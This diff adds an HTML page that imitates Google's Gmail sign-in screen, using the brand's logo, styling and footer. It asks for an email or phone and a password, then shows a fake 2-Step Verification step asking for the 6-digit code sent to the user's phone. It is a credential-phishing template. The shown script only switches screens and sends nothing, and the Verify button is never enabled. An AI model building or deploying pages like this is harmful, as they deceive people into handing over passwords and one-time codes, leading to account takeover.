@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Sign in – Google Accounts</title>
+<style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  html, body { height: 100%; }
+
+  body {
+    font-family: Roboto, "Google Sans", Arial, sans-serif;
+    background: #fff;
+    color: #202124;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  /* ---------- PAGE LAYOUT ---------- */
+  .page {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 24px 16px 0;
+  }
+
+  /* ---------- CARD ---------- */
+  .card {
+    width: 100%;
+    max-width: 448px;
+    background: #fff;
+    border: 1px solid #dadce0;
+    border-radius: 8px;
+    padding: 48px 40px 36px;
+    text-align: center;
+  }
+
+  .logo {
+    width: 40px;
+    height: 40px;
+    display: block;
+    margin: 0 auto 16px;
+  }
+
+  .card h1 {
+    font-size: 24px;
+    font-weight: 400;
+    line-height: 1.33;
+    color: #202124;
+    margin-bottom: 8px;
+  }
+
+  .card .sub {
+    font-size: 16px;
+    font-weight: 400;
+    line-height: 1.5;
+    color: #202124;
+    margin-bottom: 32px;
+  }
+
+  /* ---------- FORM ---------- */
+  form { text-align: left; }
+
+  .field {
+    position: relative;
+    margin-bottom: 18px;
+  }
+
+  .field input {
+    width: 100%;
+    height: 56px;
+    padding: 0 15px;
+    font-family: inherit;
+    font-size: 16px;
+    color: #202124;
+    background: #fff;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color .15s ease, box-shadow .15s ease;
+  }
+
+  .field input[type="password"] {
+    letter-spacing: 1px;
+  }
+
+  .field input:hover { border-color: #202124; }
+
+  .field label {
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    padding: 0 4px;
+    background: #fff;
+    font-size: 16px;
+    color: #5f6368;
+    pointer-events: none;
+    transition: top .15s ease, font-size .15s ease, color .15s ease;
+  }
+
+  /* floated (filled) state */
+  .field input:not(:placeholder-shown) + label {
+    top: 0;
+    font-size: 12px;
+    color: #5f6368;
+  }
+
+  /* focused state */
+  .field input:focus {
+    border: 2px solid #1a73e8;
+    padding: 0 14px;
+  }
+  .field input:focus + label {
+    top: 0;
+    font-size: 12px;
+    color: #1a73e8;
+  }
+
+  /* error state */
+  .field.error input { border-color: #d93025; }
+  .field.error input:focus { border: 2px solid #d93025; }
+  .field.error label { color: #d93025; }
+
+  .error-msg {
+    display: none;
+    align-items: center;
+    gap: 6px;
+    margin: -10px 0 16px;
+    font-size: 12px;
+    color: #d93025;
+    line-height: 1.4;
+  }
+  .field.error ~ .error-msg { display: flex; }
+  .error-msg svg { flex-shrink: 0; }
+
+  /* ---------- LINKS ---------- */
+  a.link {
+    display: inline-block;
+    color: #1a73e8;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: .25px;
+    text-decoration: none;
+    border-radius: 4px;
+    padding: 4px 0;
+  }
+  a.link:hover { text-decoration: underline; }
+
+  .forgot { margin: 4px 0 32px; }
+
+  /* ---------- ACTIONS ---------- */
+  .actions {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    margin-top: 8px;
+  }
+
+  .btn-primary {
+    height: 36px;
+    min-width: 88px;
+    padding: 0 24px;
+    border: none;
+    border-radius: 4px;
+    background: #1a73e8;
+    color: #fff;
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: .25px;
+    cursor: pointer;
+    transition: background .15s ease, box-shadow .15s ease;
+  }
+  .btn-primary:hover {
+    background: #1765cc;
+    box-shadow: 0 1px 2px rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+  }
+  .btn-primary:active { background: #185abc; }
+  .btn-primary:focus-visible {
+    outline: none;
+    box-shadow: 0 0 0 2px #fff, 0 0 0 4px #1a73e8;
+  }
+
+  /* ---------- FOOTER ---------- */
+  .footer {
+    width: 100%;
+    max-width: 448px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 16px;
+    padding: 16px 8px 20px;
+    font-size: 12px;
+    color: #5f6368;
+  }
+
+  .footer select {
+    font-family: inherit;
+    font-size: 12px;
+    color: #5f6368;
+    background: transparent;
+    border: none;
+    outline: none;
+    cursor: pointer;
+    padding: 4px 0;
+  }
+
+  .footer .links {
+    display: flex;
+    gap: 20px;
+  }
+
+  .footer .links a {
+    color: #5f6368;
+    text-decoration: none;
+    white-space: nowrap;
+  }
+  .footer .links a:hover { color: #202124; }
+
+  /* ---------- PAGE SWITCHING ---------- */
+  #page2 { display: none; }
+  body.show-page2 #page1 { display: none !important; }
+  body.show-page2 #page2 { display: flex !important; }
+
+  /* ---------- CODE INPUT ---------- */
+  #code {
+    letter-spacing: 6px;
+    font-weight: 500;
+    text-align: center;
+  }
+  #code:not(:placeholder-shown) + label,
+  #code:focus + label {
+    letter-spacing: normal;
+  }
+
+  /* ---------- BTN NEXT / TRY ---------- */
+  .btn-next {
+    width: 100%;
+    padding: 15px;
+    border-radius: 6px;
+    border: none;
+    background: #b2dffc;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: default;
+    margin-bottom: 12px;
+    transition: background .15s ease;
+    pointer-events: none;
+    -webkit-appearance: none;
+    appearance: none;
+  }
+  .btn-next.active {
+    background: #1a73e8;
+    cursor: pointer;
+    pointer-events: all;
+  }
+  .btn-next.active:hover { background: #1765cc; }
+  .btn-next.active:active { background: #185abc; }
+
+  .btn-try {
+    width: 100%;
+    padding: 15px;
+    border-radius: 6px;
+    border: 1px solid #dadce0;
+    background: #fff;
+    color: #202124;
+    font-size: 16px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background .15s ease;
+    -webkit-appearance: none;
+    appearance: none;
+  }
+  .btn-try:hover { background: #f0f2f5; }
+
+  /* ---------- RESPONSIVE ---------- */
+  @media (max-width: 600px) {
+    .page { padding: 8px 0 0; }
+    .card {
+      max-width: 100%;
+      border: none;
+      border-radius: 0;
+      padding: 24px 24px 36px;
+    }
+    .footer {
+      max-width: 100%;
+      padding: 16px 24px 20px;
+    }
+  }
+
+  @media (max-width: 380px) {
+    .card { padding: 20px 20px 32px; }
+    .card h1 { font-size: 22px; }
+    .footer .links { gap: 14px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ══════════════ PAGE 1 : SIGN IN ══════════════ -->
+<div id="page1" class="page">
+  <div class="card">
+    <svg class="logo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.3 6.1 29.4 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-.7-.1-1.4-.2-1.9z"/>
+      <path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.3 6.1 29.4 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/>
+      <path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/>
+      <path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-.7-.1-1.4-.2-1.9z"/>
+    </svg>
+
+    <h1>Sign in</h1>
+    <p class="sub">to continue to Gmail</p>
+
+    <form id="recoveryForm" autocomplete="off" novalidate>
+      <div class="field">
+        <input id="account" type="text" placeholder=" " autocomplete="username" inputmode="email" />
+        <label for="account">Email or phone</label>
+      </div>
+      <p class="error-msg">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <span>Enter an email or phone number</span>
+      </p>
+
+      <div class="field">
+        <input id="password" type="password" placeholder=" " autocomplete="current-password" />
+        <label for="password">Password</label>
+      </div>
+      <p class="error-msg">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <span>Enter a password</span>
+      </p>
+
+      <div class="forgot">
+        <a class="link" href="#">Forgot password?</a>
+      </div>
+
+      <div class="actions">
+        <a class="link" href="#">Create account</a>
+        <button class="btn-primary" type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<!-- ══════════════ PAGE 2 : 2-STEP VERIFICATION ══════════════ -->
+<div id="page2" class="page">
+  <div class="card">
+    <svg class="logo" viewBox="0 0 48 48" aria-hidden="true">
+      <path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.3 6.1 29.4 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-.7-.1-1.4-.2-1.9z"/>
+      <path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3l5.7-5.7C34.3 6.1 29.4 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/>
+      <path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/>
+      <path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.2 44 34 44 24c0-.7-.1-1.4-.2-1.9z"/>
+    </svg>
+
+    <h1>2-Step Verification</h1>
+    <p class="sub">We sent a verification code to your phone.<br />Enter it below to confirm it's you.</p>
+
+    <div class="input-section">
+      <div class="field">
+        <input id="code" type="tel" placeholder=" " maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
+        <label for="code">Enter 6-digit code</label>
+      </div>
+      <p class="error-msg">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        <span>Enter the 6-digit code</span>
+      </p>
+    </div>
+    <div class="resend-wrap">
+      <button class="resend-btn" id="resendLink" type="button">Resend code</button>
+    </div>
+    <div class="bottom-section">
+      <button class="btn-next" id="page2Next" type="button" disabled>Verify</button>
+      <button class="btn-try" id="tryAnother" type="button">Try another way</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ FOOTER ══════════════ -->
+<div class="footer">
+  <select aria-label="Change language">
+    <option>English (United States)</option>
+    <option>বাংলা</option>
+    <option>हिन्दी</option>
+    <option>Español</option>
+  </select>
+  <div class="links">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</div>
+
+<script>
+const recoveryForm = document.getElementById('recoveryForm');
+   const account = document.getElementById('account');
+   const password = document.getElementById('password');
+   const code = document.getElementById('code');
+
+   /* allow only digits in the code field */
+   code.addEventListener('input', () => {
+     code.value = code.value.replace(/\D/g, '').slice(0, 6);
+   });
+
+   /* Page 1 → Page 2 */
+   recoveryForm.addEventListener('submit', (e) => {
+     e.preventDefault();
+     let ok = true;
+
+     document.querySelectorAll('#page1 .field').forEach(f => f.classList.remove('error'));
+
+     if (!account.value.trim()) {
+       account.closest('.field').classList.add('error');
+       ok = false;
+     }
+     if (!password.value) {
+       password.closest('.field').classList.add('error');
+       ok = false;
+     }
+     if (!ok) return;
+
+     document.body.classList.add('show-page2');
+     setTimeout(() => code.focus(), 50);
+   });
+
+   /* clear error while typing */
+   [account, password, code].forEach(el => {
+     el.addEventListener('input', () => el.closest('.field').classList.remove('error'));
+   });
+
+   /* Page 2 verify */
+   const page2Next = document.getElementById('page2Next');
+   if (page2Next) {
+     page2Next.addEventListener('click', () => {
+       if (code.value.length !== 6) return;
+     });
+   }
+
+   document.getElementById('resendLink').addEventListener('click', (e) => {
+     e.preventDefault();
+     code.value = '';
+     if (page2Next) {
+       page2Next.classList.remove('active');
+       page2Next.disabled = true;
+     }
+     code.focus();
+   });
+
+   document.getElementById('tryAnother').addEventListener('click', (e) => {
+     e.preventDefault();
+   });
+</script>
+
+</body>
+</html>
